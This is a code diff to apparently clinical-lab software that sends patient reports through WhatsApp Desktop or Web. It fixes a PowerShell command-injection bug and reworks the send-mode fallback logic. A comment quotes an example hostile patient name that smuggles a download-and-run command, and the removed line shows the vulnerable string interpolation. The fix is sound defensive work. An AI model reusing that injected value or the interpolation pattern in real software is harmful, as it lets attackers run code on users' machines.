@@ -94,10 +94,19 @@ def copy_file_to_clipboard(path: Path) -> bool:
         # Set-Clipboard -Path puts a real file object on the clipboard, which is
         # what WhatsApp accepts as an attachment. Copying the text of the path
         # would only paste the path as a message.
-        script = f'Set-Clipboard -LiteralPath "{p}"'
+        #
+        # The path is passed as an ARGUMENT, never built into the script text.
+        # It used to be interpolated: f'Set-Clipboard -LiteralPath "{p}"'. The
+        # path contains the patient's folder name, PowerShell expands $(...)
+        # inside a double-quoted string, and the folder-name filter strips only
+        # the characters Windows forbids -- so a patient registered as
+        #     Anil $(Invoke-WebRequest http://.../x.exe -OutFile y.exe; ./y)
+        # ran that command on the laboratory PC the first time anyone pressed
+        # Send for them. $args[0] is data; PowerShell never parses it.
         try:
             subprocess.run(
-                ["powershell", "-NoProfile", "-NonInteractive", "-Command", script],
+                ["powershell", "-NoProfile", "-NonInteractive", "-Command",
+                 "Set-Clipboard -LiteralPath $args[0]", "-args", str(p)],
                 check=True, capture_output=True, timeout=15,
                 creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0),
             )
@@ -210,17 +219,42 @@ class WhatsAppDesktopSender:
         text = urllib.parse.quote(message or "", safe="")
         tried: List[str] = []
 
-        use_desktop = self.mode in ("auto", "desktop")
-        if self.mode == "auto" and not desktop_app_available():
-            use_desktop = False
-
-        if use_desktop:
+        # Three modes, and the difference between them matters:
+        #
+        #   desktop  the application only. A report cannot be attached to
+        #            WhatsApp Web -- the paste lands in a browser tab, where
+        #            LabSoft has no way to put a file -- so falling back to
+        #            the browser would send a message with no report on it
+        #            and still report success. This is the default.
+        #   auto     the application if it is there, the browser if not.
+        #   web      the browser, message only.
+        if self.mode == "desktop":
+            if not desktop_app_available():
+                raise SendError(
+                    "The WhatsApp application is not installed on this PC, so "
+                    "the report cannot be attached.\n\n"
+                    "Install WhatsApp for Windows from whatsapp.com and sign "
+                    "in once. LabSoft will then open it on the right chat "
+                    "with the report ready to attach.\n\n"
+                    "Until then, choose “The browser only” under Settings › "
+                    "WhatsApp to send the message without the report.\n\n"
+                    f"The report is saved and ready at:\n{pdf}")
             if open_url(desktop_url(number, text)):
                 return self._result("whatsapp", number, copied,
                                     "WhatsApp Desktop")
             tried.append("the WhatsApp desktop app")
 
-        if self.mode != "desktop":
+        elif self.mode == "auto":
+            if desktop_app_available() and open_url(desktop_url(number, text)):
+                return self._result("whatsapp", number, copied,
+                                    "WhatsApp Desktop")
+            tried.append("the WhatsApp desktop app")
+            if open_url(web_url(number, text)):
+                return self._result("whatsapp_web", number, copied,
+                                    "WhatsApp Web in your browser")
+            tried.append("WhatsApp Web")
+
+        else:
             if open_url(web_url(number, text)):
                 return self._result("whatsapp_web", number, copied,
                                     "WhatsApp Web in your browser")
@@ -235,7 +269,11 @@ class WhatsAppDesktopSender:
 
     def _result(self, channel: str, number: str, copied: bool,
                 where: str) -> SendResult:
-        if copied:
+        if copied and channel == "whatsapp_web":
+            step = (f"{where} is opening for {number}.\n"
+                    "A browser cannot take the report from LabSoft — attach it "
+                    "yourself with 'Open folder'.")
+        elif copied:
             step = (f"{where} is opening for {number}.\n"
                     "When the chat appears, press Ctrl+V then Enter to attach "
                     "the report.")
